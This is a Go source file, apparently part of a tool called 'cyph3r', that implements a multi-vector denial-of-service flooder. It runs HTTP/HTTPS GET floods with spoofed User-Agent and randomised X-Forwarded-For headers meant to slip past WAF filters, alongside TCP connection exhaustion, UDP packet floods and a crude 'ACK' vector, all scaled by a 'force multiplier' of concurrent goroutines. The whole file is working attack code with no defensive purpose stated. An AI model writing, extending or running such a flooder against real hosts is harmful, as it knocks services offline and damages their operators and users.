package intel

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"time"
	"github.com/AnonPhoenix420/cyph3r/internal/models"
	"github.com/AnonPhoenix420/cyph3r/internal/output"
)

func RunTacticalTest(cfg models.TacticalConfig, ctx context.Context, client *http.Client) {
	fmt.Printf("\n%s[GHOST_MODE] %sENGAGING %s OMNI-VECTOR -> %s:%s%s\n", output.NeonPink, output.Bold, cfg.Vector, cfg.Target, cfg.Port, output.Reset)
	fmt.Printf("%s[!] FORCE_MULTIPLIER: %dx ACTIVE (%d Req/Sec)%s\n", output.Amber, cfg.Power, cfg.PPS*cfg.Power, output.Reset)

	ticker := time.NewTicker(time.Second / time.Duration(cfg.PPS))
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			fmt.Printf("\n%s[+] Mission vectors collapsed.%s\n", output.NeonGreen, output.Reset)
			return
		case <-ticker.C:
			// The Multiplier: Launches Power x workers every tick
			for i := 0; i < cfg.Power; i++ {
				go executeVector(cfg, client)
			}
		}
	}
}

func executeVector(cfg models.TacticalConfig, client *http.Client) {
	addr := net.JoinHostPort(cfg.Target, cfg.Port)
	switch cfg.Vector {
	case "HULK", "HTTPS", "HTTP":
		proto := "https://"
		if cfg.Vector == "HTTP" { proto = "http://" }
		req, _ := http.NewRequest("GET", proto+addr, nil)
		// Spoofing headers to bypass basic WAF filters
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36")
		req.Header.Set("X-Forwarded-For", fmt.Sprintf("1.1.%d.%d", time.Now().UnixNano()%255, time.Now().UnixNano()%255))
		resp, err := client.Do(req)
		if err == nil { resp.Body.Close() }
	case "SYN", "TCP":
		// High-speed connection exhaustion
		d := net.Dialer{Timeout: 400 * time.Millisecond}
		conn, err := d.Dial("tcp", addr)
		if err == nil { 
			// Keep-alive just long enough to hold the socket open
			time.Sleep(20 * time.Millisecond) 
			conn.Close() 
		}
	case "UDP":
		// Raw packet flooding
		conn, _ := net.Dial("udp", addr)
		if conn != nil { 
			conn.Write(make([]byte, 1350)) // MTU optimized
			conn.Close() 
		}
	case "ACK":
		conn, _ := net.Dial("tcp", addr)
		if conn != nil { 
			conn.Write([]byte("ACK"))
			conn.Close() 
		}
	}
}
